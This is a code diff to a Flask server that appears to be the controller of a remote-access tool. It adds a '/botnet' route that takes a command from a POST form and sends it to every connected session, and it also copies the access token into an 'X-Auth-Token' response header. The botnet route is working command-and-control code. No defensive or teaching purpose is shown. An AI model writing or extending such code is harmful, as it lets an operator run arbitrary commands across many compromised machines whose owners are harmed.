@@ -126,6 +126,7 @@ def auth():
         }
     )
     res.status_code = 200
+    res.headers['X-Auth-Token'] = access_token
     res.set_cookie('access_token_cookie', access_token, httponly=True, secure=True)
     return res
 
@@ -762,6 +763,27 @@ def interact():
             'status': 'error',
             'msg': 'Invalid mode specified'
         }, 400
+
+@bp.route(f'/botnet', methods=['POST'])
+@jwt_required()
+def botnet():
+    # check if the field 'command' is present:
+    if 'command' not in request.form:
+        return {
+            'status': 'error',
+            'msg': 'No command specified'
+        }, 400
+    
+    command = request.form.get('command')
+    log(f"Executing command [RED]{command}[RESET] on all sessions", LogLevel.INFO)
+    for i in connections.keys():
+        connections[i].send(command)
+        connections[i].recv()
+    return {
+        'status': 'success',
+        'msg': 'Command executed successfully'
+    }
+
 
 def init(
     host : str,
